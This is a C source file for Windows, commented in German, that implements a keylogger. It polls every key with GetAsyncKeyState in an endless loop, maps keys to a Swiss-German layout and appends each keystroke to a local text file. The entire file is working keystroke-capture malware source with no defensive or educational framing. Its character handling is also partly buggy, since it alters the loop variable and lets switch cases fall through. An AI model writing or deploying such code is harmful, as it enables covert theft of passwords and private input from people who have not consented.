#include <stdio.h>
#include <stdbool.h>
#include <windows.h>

// Funktion zum Aufzeichnen der Tastatureingaben
void logKeystrokes() {
    FILE *file;
    int keyState[256] = {0};  // Zustand der Tasten
    bool shiftPressed;
    int c;

    // Öffnen der Datei im Anhangsmodus
    file = fopen("testlol.txt", "a");
    
    // Endlosschleife zum Aufzeichnen der Tastatureingaben
    while (1) {
        // Prüfen des Zustands der Umschalttaste (Shift)
        if(GetAsyncKeyState(VK_SHIFT) & 0x8000){
            shiftPressed = true;
        } else {
            shiftPressed = false;
        }
        
        // Durch alle Tasten-ASCII-Werte iterieren
        for (c = 8; c <= 255; c++) {
            // Prüfen, ob die Taste gerade gedrückt wurde
            if (GetAsyncKeyState(c) & 0x8000) {
                if (keyState[c] == 0) {
                    keyState[c] = 1;  // Taste ist jetzt gedrückt

                    // Verarbeiten von Sonderzeichen und Shift-Kombinationen
                    if (c >= 'A' && c <= 'Z') {
                        // Grossbuchstaben (mit Shift-Taste)
                        if (shiftPressed == false) {
                            c += 32;  // Zu Kleinbuchstaben konvertieren
                        }
                    } else if (c >= '0' && c <= '9') {
                        // Zahlen und deren Shift-Alternativen
                        if (shiftPressed == true) {
                            switch (c) {
                                case '1': c = '+'; break;
                                case '2': c = '"'; break;
                                case '3': c = '*'; break;
                                case '4': c = 'ç'; break;
                                case '5': c = '%'; break;
                                case '6': c = '&'; break;
                                case '7': c = '/'; break;
                                case '8': c = '('; break;
                                case '9': c = ')'; break;
                                case '0': c = '='; break;
                                
                            }
                        }
                    } else {
                        // Sonderzeichen
                        if (shiftPressed == true) {
                            switch (c) {
                                case VK_OEM_PLUS: c = '*'; break;  // *
                                case VK_OEM_COMMA: c = ';'; break;  // ;
                                case VK_OEM_MINUS: c = '_'; break;  // _
                                case VK_OEM_PERIOD: c = ':'; break;  // :
                                case VK_SHIFT: c = ' ';
                                case VK_LSHIFT: c = ' ';
                                case VK_RSHIFT: c = ' ';
                            }
                        } else {
                            switch (c) {
                                case VK_OEM_PLUS: c = '+'; break;  // +
                                case VK_OEM_COMMA: c = ','; break;  // ,
                                case VK_OEM_MINUS: c = '-'; break;  // -
                                case VK_OEM_PERIOD: c = '.'; break;  // .     
                            }
                        }
                    }

                    // Sonderfall: Enter-Taste
                    if (c == VK_RETURN) {
                        fputs("[Enter] \n", file);
                    } else if (c == VK_BACK) { 
                        fputs("[Delete]", file);
                    } else {
                    
                        fputc(c, file);
                        fflush(file);
                    }
                    
                }
            } else {
                keyState[c] = 0;  // Taste ist nicht mehr gedrückt
            }
        }
        Sleep(10); // Kurze Pause, um CPU-Last zu verringern
    }

    // Schließen der Datei
    fclose(file);
}

int main() {
    
    // Starten der Tastaturaufzeichnung
    logKeystrokes();

    return 0;
}
